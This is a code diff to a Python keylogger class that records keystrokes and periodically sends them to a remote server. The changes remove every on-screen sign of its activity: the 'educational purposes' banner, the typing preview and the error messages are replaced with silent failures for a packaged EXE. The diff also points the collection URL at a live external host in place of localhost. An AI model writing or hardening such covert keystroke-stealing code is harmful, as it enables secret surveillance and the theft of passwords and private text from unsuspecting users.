@@ -28,13 +28,11 @@ class SimpleKeyLogger:
                 )
 
                 if response.status_code == 200:
-                    print(f"Sent {len(self.text)} characters to server")
                     self.text = ""  # Clear after successful send
-                else:
-                    print(f"Server error: {response.status_code}")
+                # Silent fail - don't show errors in EXE
 
-            except Exception as e:
-                print(f"Could not send data: {e}")
+            except Exception:
+                pass # Silent fail for EXE
 
         # Schedule next send
         timer = threading.Timer(self.time_interval, self.send_to_server)
@@ -52,38 +50,30 @@ class SimpleKeyLogger:
                 self.text += " "
             elif key == keyboard.Key.backspace and len(self.text) > 0:
                 self.text = self.text[:-1]
-            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt]:
                 pass
             elif key == keyboard.Key.esc:
-                print("\nStopping keylogger...")
+                # Stop kelogger
                 if self.text:
                     self.send_to_server() # Send any remaining text before stopping
                 return False
             else:
                 self.text += str(key).strip("'")
 
-            # Show real-time preview (last 50 characters)
-            preview = self.text[-50:]
-            print(f"\rTyping: {preview}", end="", flush=True)
-
         except AttributeError:
-            print(f'\n[Special key {key} pressed]')
+            pass # Ignore special key errors
 
     """Start the keylogger"""
     def start(self):
-        print("SIMPLE KEYLOGGER - FOR EDUCATIONAL PURPOSES ONLY")
-        print(f"\nKeylogger started. Sending to: {self.server_url}")
-        print("Type anything... Press ESC to stop.")
-        print("Text will be sent to server every 10 seconds.")
-        print("-" * 50)
-
         self.send_to_server() # Start the periodic sending
 
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join() # Start listening to keyboard
 
-if __name__ == "__main__":
-    SERVER_URL = "http://127.0.0.1:5000"  # For local testing, change to prod later
-
+def main():
+    SERVER_URL = "https://antma001.pythonanywhere.com"
     logger = SimpleKeyLogger(SERVER_URL)
     logger.start()
+
+if __name__ == "__main__":
+    main()
